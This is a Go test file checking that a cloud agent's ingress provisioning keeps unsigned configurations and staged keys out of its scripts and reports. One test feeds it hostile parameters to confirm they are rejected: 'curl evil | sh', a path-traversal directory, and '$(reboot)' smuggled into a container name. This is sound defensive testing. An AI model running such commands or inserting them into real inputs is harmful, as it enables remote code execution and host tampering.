package runner

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/nuit-cloud/nuit-cloud-agent/internal/ingress"
	"github.com/nuit-cloud/nuit-cloud-agent/internal/profiles"
	"github.com/nuit-cloud/nuit-cloud-agent/internal/taskverify"
)

const ingKey = "FIXTURE-RUNNER-INGRESS-KEY-41d9e0c7"

var ingSites = []ingress.Site{{File: "00-nuit-cloud-default.conf", Content: "# default\n"}, {File: "nuit-cloud-abc12345-shop.conf", Content: "server {}\n"}}
var ingCerts = []ingress.Certificate{{Dir: "/home/nuitcloud/nginx/certs/abc12345/shop.example.com",
	FullchainPEM: "-----BEGIN CERTIFICATE-----\nchain\n-----END CERTIFICATE-----\n", PrivkeyPEM: "-----BEGIN PRIVATE KEY-----\n" + ingKey + "\n-----END PRIVATE KEY-----\n"}}

func ingAnswer() map[string]any {
	return map[string]any{"revision": ingress.Revision(ingSites, ingCerts), "problems": []any{},
		"sites":        []any{map[string]any{"file": ingSites[0].File, "content": ingSites[0].Content}, map[string]any{"file": ingSites[1].File, "content": ingSites[1].Content}},
		"certificates": []any{map[string]any{"dir": ingCerts[0].Dir, "fullchainPem": ingCerts[0].FullchainPEM, "privkeyPem": ingCerts[0].PrivkeyPEM}}}
}

func ingParams() map[string]any {
	return map[string]any{"revision": ingress.Revision(ingSites, ingCerts), "confDir": "/home/nuitcloud/nginx/conf.d", "certRoot": "/home/nuitcloud/nginx/certs", "container": "nuit-nginx"}
}

func ingTask(name string, params map[string]any) *taskverify.Task {
	return &taskverify.Task{Name: name, TimeoutSeconds: 60, Params: map[string]any{"profile": ingress.Profile, "ingress": params}}
}

// stageSeen records whether the stage existed while the scripts ran (it must) and is gone afterwards (it must be).
type stageSeen struct {
	fakeProfiles
	stage   string
	existed bool
}

func (s *stageSeen) Run(ctx context.Context, profile string, apply bool, env ...string) (profiles.Result, int, error) {
	for _, e := range env {
		if v, ok := strings.CutPrefix(e, "NCS_INGRESS_STAGE="); ok {
			s.stage = v
			_, err := os.Stat(filepath.Join(v, "certs", "1", "privkey.pem"))
			s.existed = err == nil
		}
	}
	return s.fakeProfiles.Run(ctx, profile, apply, env...)
}

func TestTheIngressApplyHandsTheScriptsOnlyTheSignedSettingsAndWhereTheStageIs(t *testing.T) {
	root := t.TempDir()
	f := &stageSeen{fakeProfiles: fakeProfiles{res: profiles.Result{Features: []profiles.Feature{{Name: "ncs_ingress", Status: "applied"}}}}}
	r := newRunner()
	r.Profiles = f
	r.Ingress = ingress.Provisioner{Source: fakeSource{body: ingAnswer()}, StageRoot: root}
	rep := r.Run(context.Background(), ingTask("profile-apply", ingParams()))
	if rep.Status != "done" || len(f.calls) != 1 || f.calls[0] != "apply nuit-cloud-ingress" {
		t.Fatalf("%+v %v", rep, f.calls)
	}
	env := strings.Join(f.env, "\n")
	for _, want := range []string{"NCS_INGRESS_REVISION=" + ingress.Revision(ingSites, ingCerts), "NCS_INGRESS_CONF_DIR=/home/nuitcloud/nginx/conf.d",
		"NCS_INGRESS_CERT_ROOT=/home/nuitcloud/nginx/certs", "NCS_INGRESS_CONTAINER=nuit-nginx", "NCS_INGRESS_STAGE=" + root + "/"} {
		if !strings.Contains(env, want) {
			t.Errorf("missing %s in\n%s", want, env)
		}
	}
	if strings.Contains(env, ingKey) || strings.Contains(reportText(t, rep), ingKey) {
		t.Error("key material reached the environment or the report")
	}
	if !f.existed {
		t.Error("the scripts ran without the staged key")
	}
	if _, err := os.Stat(f.stage); !os.IsNotExist(err) {
		t.Error("the stage is still there after the task")
	}
}

func TestAnIngressConfigurationThatIsNotTheSignedRevisionRunsNothing(t *testing.T) {
	root := t.TempDir()
	f := &fakeProfiles{}
	r := withProfiles(f)
	r.Ingress = ingress.Provisioner{Source: fakeSource{body: ingAnswer()}, StageRoot: root}
	p := ingParams()
	p["revision"] = strings.Repeat("0", 64)
	rep := r.Run(context.Background(), ingTask("profile-apply", p))
	if rep.Status != "failed" || !strings.Contains(rep.Output, "not the signed") || len(f.calls) != 0 {
		t.Errorf("%+v %v", rep, f.calls)
	}
	if entries, _ := os.ReadDir(root); len(entries) != 0 {
		t.Errorf("something was staged: %v", entries)
	}
}

func TestAHostileOrMisplacedIngressParameterChangesNothing(t *testing.T) {
	root := t.TempDir()
	f := &fakeProfiles{}
	r := withProfiles(f)
	r.Ingress = ingress.Provisioner{Source: fakeSource{body: ingAnswer()}, StageRoot: root}
	with := func(k string, v any) map[string]any { p := ingParams(); p[k] = v; return p }
	for name, params := range map[string]map[string]any{
		"none":                 {"profile": ingress.Profile},
		"not an object":        {"profile": ingress.Profile, "ingress": "x"},
		"an extra key":         {"profile": ingress.Profile, "ingress": with("script", "curl evil | sh")},
		"confDir with ..":      {"profile": ingress.Profile, "ingress": with("confDir", "/home/nuitcloud/../../etc/nginx")},
		"a relative certRoot":  {"profile": ingress.Profile, "ingress": with("certRoot", "certs")},
		"a container with $()": {"profile": ingress.Profile, "ingress": with("container", "$(reboot)")},
		"a bad revision":       {"profile": ingress.Profile, "ingress": with("revision", "HEAD")},
		"on another profile":   {"profile": "nuit-cloud-server", "ingress": ingParams()},
	} {
		for _, task := range []string{"profile-apply", "profile-check"} {
			if rep := r.Run(context.Background(), &taskverify.Task{Name: task, TimeoutSeconds: 30, Params: params}); rep.Status != "failed" {
				t.Errorf("%s (%s) was accepted: %+v", name, task, rep)
			}
		}
	}
	if len(f.calls) != 0 {
		t.Errorf("scripts ran: %v", f.calls)
	}
	if entries, _ := os.ReadDir(root); len(entries) != 0 {
		t.Errorf("something was staged: %v", entries)
	}
	if rep := withProfiles(&fakeProfiles{}).Run(context.Background(), ingTask("profile-apply", ingParams())); rep.Status != "failed" {
		t.Errorf("an agent without ingress support applied it: %+v", rep)
	}
}

func TestTheIngressCheckReadsNothingFromThePlatform(t *testing.T) {
	f := &fakeProfiles{exit: 1, res: profiles.Result{Features: []profiles.Feature{{Name: "ncs_ingress", Status: "drift"}}}}
	r := withProfiles(f)
	r.Ingress = ingress.Provisioner{Source: fakeSource{err: os.ErrPermission}, StageRoot: t.TempDir()}
	rep := r.Run(context.Background(), ingTask("profile-check", ingParams()))
	if rep.Status != "done" || f.calls[0] != "check nuit-cloud-ingress" || strings.Contains(strings.Join(f.env, " "), "NCS_INGRESS_STAGE") {
		t.Errorf("%+v %v", rep, f.env)
	}
}

func TestAKeyAScriptPrintsNeverReachesTheReport(t *testing.T) {
	f := &fakeProfiles{exit: 1, res: profiles.Result{Output: "oops " + ingKey, Features: []profiles.Feature{{Name: "ncs_ingress", Status: "failed", Notes: []string{"nginx said " + ingKey}}}}}
	r := withProfiles(f)
	r.Ingress = ingress.Provisioner{Source: fakeSource{body: ingAnswer()}, StageRoot: t.TempDir()}
	rep := r.Run(context.Background(), ingTask("profile-apply", ingParams()))
	if text := reportText(t, rep); rep.Status != "failed" || strings.Contains(text, ingKey) || !strings.Contains(text, "[redacted]") {
		t.Errorf("%s", text)
	}
}
